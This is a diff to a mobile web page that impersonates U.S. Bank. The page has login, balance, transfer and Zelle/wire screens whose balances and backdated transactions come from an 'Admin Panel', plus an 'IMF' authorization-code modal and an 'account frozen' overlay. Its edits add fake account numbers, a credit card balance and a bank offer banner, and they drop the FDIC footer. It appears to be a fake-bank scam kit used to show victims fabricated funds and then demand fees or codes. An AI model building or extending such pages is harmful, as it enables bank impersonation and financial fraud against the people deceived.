@@ -9,16 +9,10 @@
     <meta property="og:title" content="US Bank">
     <meta property="og:description" content="Log in to your US Bank account securely.">
     <meta property="og:image" content="https://i.ibb.co/BKLK3cr2/BF917-E7-F-55-C6-47-B5-B682-18-D0-F4958937.jpg">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
     <meta property="og:type" content="website">
-    
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="US Bank">
-    <meta name="twitter:description" content="Log in to your US Bank account securely.">
     <meta name="twitter:image" content="https://i.ibb.co/BKLK3cr2/BF917-E7-F-55-C6-47-B5-B682-18-D0-F4958937.jpg">
-    <!-- END SOCIAL MEDIA SHARE META TAGS -->
-
+    
     <style>
         :root {
             --usbank-red: #c8202e; 
@@ -45,7 +39,7 @@
         .mobile-container {
             width: 100%;
             max-width: 414px; 
-            background-color: #ffffff; 
+            background-color: var(--bg-gray); 
             min-height: 100vh;
             position: relative;
             box-shadow: 0 0 20px rgba(0,0,0,0.1);
@@ -118,91 +112,100 @@
         .form-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; }
         .submit-btn { background-color: var(--action-blue); color: #ffffff; border: none; padding: 16px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 20px; }
 
-        /* APP WRAPPER */
+        /* APP WRAPPER & DASHBOARD */
         #app-wrapper { position: relative; flex: 1; display: flex; flex-direction: column; height: 100vh; overflow: hidden; background-color: var(--bg-gray); }
-        .dash-header { display: flex; justify-content: space-between; align-items: center; padding: 16px; background-color: #ffffff; border-bottom: 1px solid #eee; position: sticky; top: 0; z-index: 100; }
+        .dash-header { display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; background-color: #ffffff; border-bottom: 1px solid #eee; position: sticky; top: 0; z-index: 100; }
         .dash-header-title { color: var(--usbank-blue); font-size: 18px; font-weight: 600; }
         .header-actions { display: flex; gap: 16px; align-items: center; }
-        .icon-btn { width: 32px; height: 32px; display: flex; justify-content: center; align-items: center; cursor: pointer; border-radius: 50%; background-color: #f0f4f9; }
-        .icon-btn svg { width: 18px; height: 18px; fill: var(--usbank-blue); }
-        .app-content { padding: 20px; flex: 1; overflow-y: auto; padding-bottom: 100px; }
+        .icon-btn { width: 30px; height: 30px; display: flex; justify-content: center; align-items: center; cursor: pointer; border-radius: 50%; background-color: #f0f4f9; }
+        .icon-btn svg { width: 16px; height: 16px; fill: var(--usbank-blue); }
         
-        .dash-date { font-size: 12px; color: #666; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px; }
-        .dash-greeting { font-size: 26px; font-weight: 700; color: var(--usbank-blue); margin-bottom: 24px; }
-        .section-title { font-size: 12px; color: #666; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 12px; margin-top: 24px; }
-        .account-card { background-color: #ffffff; border-radius: 8px; padding: 16px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); cursor: pointer; }
-        .account-name { font-size: 16px; color: #333; font-weight: 500; }
-        .account-balance { font-size: 16px; color: var(--usbank-blue); font-weight: 700; }
-        .account-balance::after { content: ' \203A'; margin-left: 8px; font-weight: normal; }
-        .total-balance-row { display: flex; justify-content: space-between; padding: 0 16px; margin-top: 8px; margin-bottom: 24px; font-size: 14px; color: #555; }
+        .app-content { padding: 16px; flex: 1; overflow-y: auto; padding-bottom: 90px; }
+        
+        .dash-date { font-size: 11px; color: #666; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px; }
+        .dash-greeting { font-size: 24px; font-weight: 700; color: var(--usbank-blue); margin-bottom: 16px; }
+        
+        /* PREQUALIFIED BANNER */
+        .offer-banner { background-color: #ffffff; border: 1px solid #e0e0e0; border-radius: 8px; padding: 12px; display: flex; align-items: center; margin-bottom: 20px; position: relative; }
+        .offer-text { flex: 1; }
+        .offer-text span { font-size: 10px; color: #777; text-transform: uppercase; letter-spacing: 0.5px; display: block; margin-bottom: 4px; }
+        .offer-text h4 { font-size: 13px; color: #333; font-weight: 600; margin-bottom: 2px; }
+        .offer-text p { font-size: 11px; color: #666; }
+        .close-offer { position: absolute; top: 8px; right: 8px; color: #aaa; font-size: 16px; cursor: pointer; }
+        
+        .section-title { font-size: 11px; color: #666; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px; margin-top: 16px; }
+        
+        .account-card { background-color: #ffffff; border-radius: 8px; padding: 14px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; box-shadow: 0 1px 2px rgba(0,0,0,0.05); cursor: pointer; }
+        .account-name { font-size: 14px; color: #333; font-weight: 500; }
+        .account-balance { font-size: 15px; color: var(--usbank-blue); font-weight: 700; }
+        .account-balance::after { content: ' \203A'; margin-left: 4px; font-weight: normal; color: #aaa; font-size: 18px; }
+        
+        .total-balance-row { display: flex; justify-content: space-between; padding: 0 14px; margin-top: 4px; margin-bottom: 20px; font-size: 13px; color: #555; }
 
-        .transaction-item { background-color: #ffffff; border-radius: 8px; padding: 16px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
-        .transaction-left h5 { font-size: 15px; color: #333; margin-bottom: 4px; }
-        .transaction-left p { font-size: 12px; color: #777; }
-        .transaction-amount { font-size: 15px; font-weight: 700; color: #333; }
+        .transaction-item { background-color: #ffffff; border-radius: 8px; padding: 14px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; box-shadow: 0 1px 2px rgba(0,0,0,0.05); }
+        .transaction-left h5 { font-size: 14px; color: #333; margin-bottom: 4px; }
+        .transaction-left p { font-size: 11px; color: #777; }
+        .transaction-amount { font-size: 14px; font-weight: 700; color: #333; }
         .amount-deposit { color: #22c55e !important; }
 
         /* TRANSFER & PAY */
-        .transfer-page-bg { background-color: var(--usbank-red); height: 100%; overflow-y: auto; padding-bottom: 100px; }
-        .transfer-page-header { padding: 32px 24px 20px 24px; }
-        .transfer-page-title { font-size: 32px; font-weight: 400; color: #ffffff; }
-        .tf-card { display: flex; align-items: center; background-color: #ffffff; padding: 24px 20px; border-radius: 16px; margin: 0 20px 16px 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); cursor: pointer; transition: transform 0.1s; }
-        .tf-card:active { transform: scale(0.98); }
-        .tf-icon-bg { width: 56px; height: 56px; background-color: #fce8e8; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-right: 16px; flex-shrink: 0; }
-        .tf-icon-bg svg { width: 28px; height: 28px; fill: var(--usbank-red); }
+        .transfer-page-bg { background-color: var(--usbank-red); height: 100%; overflow-y: auto; padding-bottom: 90px; }
+        .transfer-page-header { padding: 24px 16px 16px 16px; }
+        .transfer-page-title { font-size: 28px; font-weight: 400; color: #ffffff; }
+        .tf-card { display: flex; align-items: center; background-color: #ffffff; padding: 16px; border-radius: 12px; margin: 0 16px 12px 16px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); cursor: pointer; }
+        .tf-icon-bg { width: 44px; height: 44px; background-color: #fce8e8; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-right: 12px; flex-shrink: 0; }
+        .tf-icon-bg svg { width: 22px; height: 22px; fill: var(--usbank-red); }
         .tf-icon-bg.zelle-icon { background-color: #f4e8fc; }
         .tf-icon-bg.zelle-icon svg { fill: var(--zelle-purple); }
         .tf-info { flex: 1; }
-        .tf-info h4 { font-size: 18px; color: #000; font-weight: 700; margin-bottom: 4px; }
-        .tf-info p { font-size: 14px; color: #666; }
-        .tf-chevron { color: #ccc; font-size: 28px; font-weight: 300; }
+        .tf-info h4 { font-size: 16px; color: #000; font-weight: 700; margin-bottom: 2px; }
+        .tf-info p { font-size: 13px; color: #666; }
+        .tf-chevron { color: #ccc; font-size: 24px; }
 
         /* TRANSFER FORMS */
-        .form-page { background-color: #ffffff; height: 100%; overflow-y: auto; padding-bottom: 100px; }
-        .form-page-header { padding: 20px; border-bottom: 1px solid #eee; display: flex; align-items: center; position: sticky; top: 0; background-color: #fff; z-index: 50; }
-        .form-page-title { font-size: 20px; font-weight: 600; color: var(--usbank-blue); }
-        .form-body { padding: 24px; }
-        .form-section-title { font-size: 14px; font-weight: 700; color: var(--usbank-blue); margin: 20px 0 12px 0; padding-bottom: 4px; border-bottom: 1px solid #eee; }
+        .form-page { background-color: #ffffff; height: 100%; overflow-y: auto; padding-bottom: 90px; }
+        .form-page-header { padding: 16px; border-bottom: 1px solid #eee; display: flex; align-items: center; position: sticky; top: 0; background-color: #fff; z-index: 50; }
+        .form-page-title { font-size: 18px; font-weight: 600; color: var(--usbank-blue); }
+        .form-body { padding: 20px; }
+        .form-section-title { font-size: 13px; font-weight: 700; color: var(--usbank-blue); margin: 16px 0 10px 0; padding-bottom: 4px; border-bottom: 1px solid #eee; }
         .form-section-title:first-child { margin-top: 0; }
-        .input-field { margin-bottom: 16px; }
-        .input-field label { display: block; font-size: 13px; font-weight: 600; color: #555; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
-        .input-field input, .input-field select { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; background-color: #fafafa; }
+        .input-field { margin-bottom: 12px; }
+        .input-field label { display: block; font-size: 12px; font-weight: 600; color: #555; margin-bottom: 4px; text-transform: uppercase; }
+        .input-field input, .input-field select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; background-color: #fafafa; }
         .input-field input:focus, .input-field select:focus { outline: none; border-color: var(--action-blue); background-color: #fff; }
-        .account-select { width: 100%; padding: 12px 14px; border: 1px solid #dcdcdc; border-radius: 8px; font-size: 16px; background-color: #f0f2f5; color: #1f5dc1; font-weight: 600; appearance: none; background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22292.4%22%20height%3D%22292.4%22%3E%3Cpath%20fill%3D%22%231f5dc1%22%20d%3D%22M287%2069.4a17.6%2017.6%200%200%200-13-5.4H18.4c-5%200-9.3%201.8-12.9%205.4A17.6%2017.6%200%200%200%200%2082.2c0%205%201.8%209.3%205.4%2012.9l128%20127.9c3.6%203.6%207.8%205.4%2012.8%205.4s9.2-1.8%2012.8-5.4L287%2095c3.5-3.5%205.4-7.8%205.4-12.8%200-5-1.9-9.2-5.5-12.8z%22%2F%3E%3C%2Fsvg%3E"); background-repeat: no-repeat; background-position: right 14px top 50%; background-size: 12px auto; }
+        .account-select { width: 100%; padding: 12px; border: 1px solid #dcdcdc; border-radius: 6px; font-size: 15px; background-color: #f0f2f5; color: #1f5dc1; font-weight: 600; appearance: none; }
 
-        /* MODALS & OVERLAYS */
+        /* MODALS */
         .modal-overlay { position: absolute; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(0,0,0,0.6); z-index: 1000; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .modal-box { background-color: #ffffff; width: 100%; border-radius: 16px; padding: 32px 24px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); max-height: 90vh; overflow-y: auto; }
-        .modal-box .logo { justify-content: center; margin-bottom: 20px; }
-        .success-check { width: 60px; height: 60px; background-color: #e8f5e9; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 16px auto; }
-        .success-check svg { width: 30px; height: 30px; fill: #2e7d32; }
-        .modal-title { font-size: 20px; font-weight: 700; color: #333; margin-bottom: 4px; }
-        .modal-amount { font-size: 36px; font-weight: 700; color: var(--usbank-blue); margin-bottom: 24px; }
-        .modal-details { text-align: left; background-color: #f8f9fa; border-radius: 8px; padding: 16px; margin-bottom: 24px; }
-        .modal-row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 14px; }
-        .modal-row:last-child { margin-bottom: 0; }
+        .modal-box { background-color: #ffffff; width: 100%; border-radius: 16px; padding: 24px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); max-height: 90vh; overflow-y: auto; }
+        .modal-box .logo { justify-content: center; margin-bottom: 16px; }
+        .success-check { width: 50px; height: 50px; background-color: #e8f5e9; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 12px auto; }
+        .success-check svg { width: 24px; height: 24px; fill: #2e7d32; }
+        .modal-title { font-size: 18px; font-weight: 700; color: #333; margin-bottom: 4px; }
+        .modal-amount { font-size: 32px; font-weight: 700; color: var(--usbank-blue); margin-bottom: 16px; }
+        .modal-details { text-align: left; background-color: #f8f9fa; border-radius: 8px; padding: 12px; margin-bottom: 16px; }
+        .modal-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; }
         .modal-row span:first-child { color: #666; }
         .modal-row span:last-child { font-weight: 600; color: #333; text-align: right; max-width: 60%; }
-        .modal-footer { font-size: 11px; color: #999; margin-top: 20px; }
-
-        /* EXACT DESIGN: AUTH VERIFY MODAL */
-        #imf-modal .modal-box { background: #ffffff; border-radius: 16px; padding: 40px 24px 30px 24px; }
-        .auth-lock-icon { width: 50px; height: 50px; margin: 0 auto 15px; }
+        
+        /* AUTH MODAL */
+        #imf-modal .modal-box { padding: 32px 24px; }
+        .auth-lock-icon { width: 40px; height: 40px; margin: 0 auto 12px; }
         .auth-lock-icon svg { width: 100%; height: 100%; fill: none; stroke: #d32f2f; stroke-width: 2.5; }
-        #imf-modal h3 { color: #d32f2f; font-size: 22px; font-weight: 700; margin-bottom: 12px; }
-        #imf-modal p { color: #333; font-size: 15px; margin-bottom: 25px; line-height: 1.4; }
-        #imf-modal .input-field input { border: 1px solid #ccc; border-radius: 8px; padding: 16px; text-align: center; font-size: 18px; margin-bottom: 20px; }
-        #imf-modal .btn-verify { background: #d32f2f; color: white; border-radius: 30px; padding: 16px; font-size: 16px; font-weight: 600; margin-bottom: 15px; border: none; cursor: pointer; width: 100%; }
-        #imf-modal .btn-cancel { background: #ffffff; color: #333; border: 1px solid #ccc; border-radius: 30px; padding: 16px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; }
+        #imf-modal h3 { color: #d32f2f; font-size: 20px; font-weight: 700; margin-bottom: 8px; }
+        #imf-modal p { color: #333; font-size: 14px; margin-bottom: 20px; line-height: 1.4; }
+        #imf-modal .input-field input { border: 1px solid #ccc; border-radius: 8px; padding: 14px; text-align: center; font-size: 16px; margin-bottom: 16px; }
+        #imf-modal .btn-verify { background: #d32f2f; color: white; border-radius: 30px; padding: 14px; font-size: 15px; font-weight: 600; margin-bottom: 12px; border: none; cursor: pointer; width: 100%; }
+        #imf-modal .btn-cancel { background: #ffffff; color: #333; border: 1px solid #ccc; border-radius: 30px; padding: 14px; font-size: 15px; font-weight: 600; cursor: pointer; width: 100%; }
 
-        /* EXACT DESIGN: ACCOUNT RESTRICTED MODAL */
+        /* FROZEN MODAL */
         #frozen-overlay { background: rgba(0,0,0,0.7); z-index: 3000; }
-        #frozen-overlay .modal-box { background: #ffffff; border-radius: 16px; padding: 40px 24px 30px 24px; }
-        .frozen-icon { width: 60px; height: 60px; margin: 0 auto 20px; }
+        #frozen-overlay .modal-box { padding: 32px 24px; }
+        .frozen-icon { width: 50px; height: 50px; margin: 0 auto 16px; }
         .frozen-icon svg { width: 100%; height: 100%; fill: #d32f2f; }
-        #frozen-overlay h2 { color: #d32f2f; font-size: 22px; font-weight: 700; margin-bottom: 15px; }
-        #frozen-overlay p { color: #333; font-size: 16px; line-height: 1.5; margin-bottom: 30px; }
-        #frozen-overlay .btn-close { background: #d32f2f; color: white; border-radius: 30px; padding: 16px; font-size: 16px; font-weight: 600; border: none; cursor: pointer; width: 100%; }
+        #frozen-overlay h2 { color: #d32f2f; font-size: 20px; font-weight: 700; margin-bottom: 12px; }
+        #frozen-overlay p { color: #333; font-size: 15px; line-height: 1.5; margin-bottom: 24px; }
+        #frozen-overlay .btn-close { background: #d32f2f; color: white; border-radius: 30px; padding: 14px; font-size: 15px; font-weight: 600; border: none; cursor: pointer; width: 100%; }
 
         /* BOTTOM NAV */
         .image-bottom-nav { position: fixed; bottom: 0; left: 50%; transform: translateX(-50%); width: 100%; max-width: 414px; z-index: 100; background-color: #ffffff; }
@@ -214,11 +217,11 @@
         .overlay-trade { left: 75%; width: 25%; }
 
         /* PROFILE */
-        .profile-info { margin-top: 20px; }
-        .profile-row { display: flex; flex-direction: column; padding: 16px 0; border-bottom: 1px solid #eee; }
-        .profile-row label { font-size: 12px; color: #777; text-transform: uppercase; font-weight: 600; margin-bottom: 4px; }
-        .profile-row span { font-size: 18px; color: #333; font-weight: 500; }
-        .logout-btn { background-color: #fff; color: var(--usbank-red); border: 1px solid var(--usbank-red); padding: 16px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 32px; margin-bottom: 20px; }
+        .profile-info { margin-top: 16px; }
+        .profile-row { display: flex; flex-direction: column; padding: 12px 0; border-bottom: 1px solid #eee; }
+        .profile-row label { font-size: 11px; color: #777; text-transform: uppercase; font-weight: 600; margin-bottom: 4px; }
+        .profile-row span { font-size: 16px; color: #333; font-weight: 500; }
+        .logout-btn { background-color: #fff; color: var(--usbank-red); border: 1px solid var(--usbank-red); padding: 14px; width: 100%; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 24px; margin-bottom: 20px; }
     </style>
 </head>
 <body>
@@ -337,17 +340,33 @@
                 <div class="app-content">
                     <div class="dash-date" id="live-date">LOADING DATE...</div>
                     <div class="dash-greeting" id="dash-greeting">Welcome, User.</div>
+                    <div class="offer-banner">
+                        <div class="offer-text">
+                            <span>PREQUALIFIED CREDIT CARD OFFER</span>
+                            <h4>Earn 20,000 free bonus points!</h4>
+                            <p>U.S. Bank Altitude® Go Visa Signature® Card</p>
+                        </div>
+                        <div class="close-offer">×</div>
+                    </div>
                     <div class="section-title">CHECKING & SAVINGS</div>
                     <div class="account-card">
-                        <div class="account-name" id="dash-acct-checking">Checking ...0000</div>
+                        <div class="account-name">Checking ...1112</div>
                         <div class="account-balance" id="dash-bal-checking">$0.00</div>
                     </div>
                     <div class="account-card">
-                        <div class="account-name" id="dash-acct-savings">Savings ...0000</div>
+                        <div class="account-name">Savings ...2223</div>
                         <div class="account-balance" id="dash-bal-savings">$0.00</div>
                     </div>
                     <div class="total-balance-row">
                         <div>Total balance</div><div id="dash-bal-total">$0.00</div>
+                    </div>
+                    <div class="section-title">CREDIT CARDS</div>
+                    <div class="account-card">
+                        <div class="account-name">Credit card ...2222</div>
+                        <div class="account-balance" id="dash-bal-credit">$500.99</div>
+                    </div>
+                    <div class="total-balance-row" style="margin-bottom: 10px;">
+                        <div>Available credit $9,799.28</div>
                     </div>
                 </div>
             </div>
@@ -479,7 +498,6 @@
                         <div class="modal-row"><span>Date</span><span id="receipt-date">-</span></div>
                     </div>
                     <button class="submit-btn" onclick="finishTransfer()">Done</button>
-                    <div class="modal-footer">Member FDIC. Equal Housing Lender.<br>© 2023 U.S. Bank</div>
                 </div>
             </div>
 
@@ -533,11 +551,11 @@
             }
         };
 
-        // CRITICAL: This function fetches the latest data from the Admin Panel
+        // Sync with Admin Panel
         function syncData() {
             users = JSON.parse(localStorage.getItem('bank_users')) || {};
             if (currentUser) {
-                currentUser = users[currentUser.username]; // Update current user with latest admin changes
+                currentUser = users[currentUser.username]; 
             }
         }
 
@@ -562,10 +580,7 @@
             let chk = parseFloat(currentUser.checking_bal).toFixed(2);
             let sav = parseFloat(currentUser.savings_bal).toFixed(2);
             let total = (parseFloat(chk) + parseFloat(sav)).toFixed(2);
-            let last4 = currentUser.acctNum.slice(-4);
 
-            document.getElementById('dash-acct-checking').textContent = `Checking ...${last4}`;
-            document.getElementById('dash-acct-savings').textContent = `Savings ...${last4}`;
             document.getElementById('dash-bal-checking').textContent = `$${chk}`;
             document.getElementById('dash-bal-savings').textContent = `$${sav}`;
             document.getElementById('dash-bal-total').textContent = `$${total}`;
@@ -575,8 +590,8 @@
                 const select = document.getElementById(id);
                 if (select) {
                     select.innerHTML = `
-                        <option value="Checking">Checking ...${last4} ($${chk})</option>
-                        <option value="Savings">Savings ...${last4} ($${sav})</option>
+                        <option value="Checking">Checking ...1112 ($${chk})</option>
+                        <option value="Savings">Savings ...2223 ($${sav})</option>
                     `;
                 }
             });
@@ -588,7 +603,7 @@
             document.getElementById(pageId).classList.remove('hidden');
             
             if (pageId === 'app-wrapper') {
-                syncData(); // Refresh data when opening app
+                syncData(); 
                 if(!checkAccountStatus()) return; 
                 initDashboard();
                 updateBalancesUI();
@@ -597,7 +612,7 @@
         }
 
         function switchTab(tabName) {
-            syncData(); // Refresh data EVERY time a tab is clicked
+            syncData(); 
             if(!checkAccountStatus()) return; 
 
             const views = ['tab-accounts', 'tab-pay-transfer', 'tab-history', 'form-usbank', 'form-otherbank', 'form-zelle', 'form-wire'];
@@ -611,7 +626,7 @@
                 updateBalancesUI();
             } else if (tabName === 'history') {
                 document.getElementById('tab-history').classList.remove('hidden');
-                renderTransactions(); // Will now show backdated transactions from admin
+                renderTransactions();
             }
         }
 
@@ -724,7 +739,6 @@
                     let amountClass = isCredit ? 'transaction-amount amount-deposit' : 'transaction-amount';
                     let amountPrefix = isCredit ? '+' : '-';
 
-                    // THIS DISPLAYS THE BACKDATED DATE FROM ADMIN
                     item.innerHTML = `
                         <div class="transaction-left">
                             <h5>${isCredit ? 'Deposit / Credit' : 'Transfer to'} ${tx.to}</h5>
@@ -776,7 +790,7 @@
             const enteredUser = document.getElementById('login-username').value.trim().toLowerCase();
             const enteredPass = document.getElementById('login-password').value;
             
-            syncData(); // Fetch latest before logging in
+            syncData();
 
             if (users[enteredUser] && users[enteredUser].password === enteredPass) {
                 currentUser = users[enteredUser];
